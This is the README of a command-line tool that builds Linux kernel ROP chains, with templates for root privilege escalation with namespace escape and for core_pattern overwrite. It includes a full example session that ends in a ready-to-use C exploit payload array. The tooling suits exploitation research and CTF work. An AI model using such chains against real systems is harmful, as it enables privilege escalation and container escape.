# exkrop — Interactive Kernel ROP Chain Generator

CLI tool that wraps [exrop](../README.md) to provide a guided workflow for generating kernel ROP chains with pivot gadget selection and C code output.

## Usage

```
PYTHONPATH=. python3 -m exkrop <vmlinux>
```

## Features

- **Template-based chain building** — choose from predefined exploit templates:
  - **Privilege Escalation**: `commit_creds(init_cred)` + namespace escape via `switch_task_namespaces` + `fork` + `msleep`
  - **core_pattern Overwrite**: `_copy_from_user(core_pattern, user_buf, len)` + `msleep`
- **KASLR-relative output** — all kernel addresses emitted as `KERN(offset)` with a `KERN_BASE` macro
- **Pivot gadget browser** — paginated selection of stack pivot gadgets (direct, offset, JOP chained, indirect) with detail view
- **Reserved offset handling** — specify object offsets that must be preserved (e.g., vtable pointers); shift gadgets (`add rsp, N; ret`) are automatically inserted to skip over them
- **JOP dispatch awareness** — JOP pivot dispatch entries are treated as occupied slots and automatically skipped
- **Single C array output** — generates a ready-to-use `exploit_obj[]` array with `#define`s, per-line annotations, and pivot documentation

## Workflow

1. Load vmlinux and gadget cache
2. Select exploit template
3. Resolve kernel symbols and base address
4. Build ROP chain
5. Select pivot source register (rdi, rsi, rdx, etc.)
6. Optionally specify reserved object offsets
7. Browse and select a pivot gadget
8. Get generated C code (with optional file save)

## Example Output

### Privilege Escalation with JOP Pivot (chain at +0x0, dispatch at +0x8)

```
$ PYTHONPATH=. python3 -m exkrop /path/to/vmlinux
Loading /path/to/vmlinux...
Loading cache from ./_path_to_vmlinux_kernel_d15.exrop_cache
Gadgets loaded.

=== ROP Chain Templates ===
  [1] Privilege Escalation — commit_creds(init_cred) + namespace escape + fork + msleep
  [2] core_pattern Overwrite — _copy_from_user(core_pattern, user_buf, len) + msleep

Select template [1-2]: 1

Resolving kernel base...
  Kernel base: 0xffffffff81000000
Resolving symbols...
  __x64_sys_fork                 0xffffffff811a6440 (base + 0x1a6440)
  commit_creds                   0xffffffff811e37d0 (base + 0x1e37d0)
  find_task_by_vpid              0xffffffff811d6c00 (base + 0x1d6c00)
  init_cred                      0xffffffff840953a0 (base + 0x30953a0)
  init_nsproxy                   0xffffffff84094e80 (base + 0x3094e80)
  msleep                         0xffffffff812732f0 (base + 0x2732f0)
  switch_task_namespaces         0xffffffff811e16d0 (base + 0x1e16d0)

=== Building ROP chain ===

[*] commit_creds(init_cred)
$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0xffffffff840953a0
$RSP+0x0010 : 0xffffffff811e37d0

[*] find_task_by_vpid(1)
$RSP+0x0000 : 0xffffffff815cd6ad # mov edi, 1 ; mov eax, edi ; ret
$RSP+0x0008 : 0xffffffff811d6c00

[*] switch_task_namespaces(rax, init_nsproxy)
$RSP+0x0000 : 0xffffffff8243485a # push rax ; add eax, ebp ; pop rdi ; ret
$RSP+0x0008 : 0xffffffff8115fbce # pop rsi ; ret
$RSP+0x0010 : 0xffffffff84094e80
$RSP+0x0018 : 0xffffffff811e16d0

[*] fork(0)
$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0x0000000000000000
$RSP+0x0010 : 0xffffffff811a6440

[*] msleep(1000000000)
$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0x000000003b9aca00
$RSP+0x0010 : 0xffffffff812732f0

=== Pivot Register ===
  [ 1] rdi
  ...

Select pivot source register [1-13]: 1
Reserved object offsets (hex, comma-separated, e.g. 0x10,0x18) [none]:

Searching for pivots from rdi...
Found 5 pivot(s).

--- Pivot candidates (1-5 of 5) ---
  [ 1] jop            @ 0xffffffff81e3f0d6 # mov rbx, rdi ; mov rax, qword ptr [rdi + 8] ; call rax (chain at +0x0)
  [ 2] jop            @ 0xffffffff81e3f0d6 # mov rbx, rdi ; mov rax, qword ptr [rdi + 8] ; call rax (chain at +0x10)
  ...
  [d N] Details  [q] Quit

Select pivot: 1

Occupied offsets within chain region: 0x8
  0x8: JOP dispatch -> 0xffffffff81ccac6f
Inserting shift gadgets to skip occupied slots...
  0x0: lea rsp, [rsp + 8] ; ret (skip 0x8 bytes)

=== Generated C code ===

#include <stdint.h>

#define KERN_BASE 0xffffffff81000000ULL
#define KERN(off) (KERN_BASE + (off))

// Privilege escalation: get root + escape namespaces

/*
 * Pivot type: jop
 * Source register: rdi
 * Step 1: KERN(0xe3f0d6) @ mov rbx, rdi ; mov rax, qword ptr [rdi + 8] ; call rax
 * Pivot: KERN(0xccac6f) @ push rbx ; pop rsp ; add ecx, dword ptr [rax - 0x39] ; ret
 * Dispatch: place KERN(0xccac6f) at [rdi+0x8]
 * ROP chain starts at [rdi+0x0]
 */
#define PIVOT_GADGET KERN(0xe3f0d6)
#define OBJ_SIZE     0x100
#define CHAIN_OFFSET 0x0
#define DISPATCH_0_OFFSET 0x8

uint64_t exploit_obj[] = {
    KERN(0x177b940)       , // +0x00 | ROP chain start | shift: lea rsp, [rsp + 8] ; ret (skip 0x8)
    KERN(0xccac6f)        , // +0x08 | dispatch[0] -> KERN(0xccac6f)
    KERN(0x177704)        , // +0x10 | pop rdi ; ret
    KERN(0x30953a0)       , // +0x18 | init_cred
    KERN(0x1e37d0)        , // +0x20 | commit_creds
    KERN(0x5cd6ad)        , // +0x28 | mov edi, 1 ; mov eax, edi ; ret
    KERN(0x1d6c00)        , // +0x30 | find_task_by_vpid
    KERN(0x143485a)       , // +0x38 | push rax ; add eax, ebp ; pop rdi ; ret
    KERN(0x15fbce)        , // +0x40 | pop rsi ; ret
    KERN(0x3094e80)       , // +0x48 | init_nsproxy
    KERN(0x1e16d0)        , // +0x50 | switch_task_namespaces
    KERN(0x177704)        , // +0x58 | pop rdi ; ret
    0x0000000000000000ULL , // +0x60
    KERN(0x1a6440)        , // +0x68 | __x64_sys_fork
    KERN(0x177704)        , // +0x70 | pop rdi ; ret
    0x000000003b9aca00ULL , // +0x78
    KERN(0x2732f0)        , // +0x80 | msleep
};
```

The shift gadget at `+0x00` (`lea rsp, [rsp + 8] ; ret`) skips over the JOP dispatch pointer at `+0x08`, then the full ROP chain executes from `+0x10` onward.
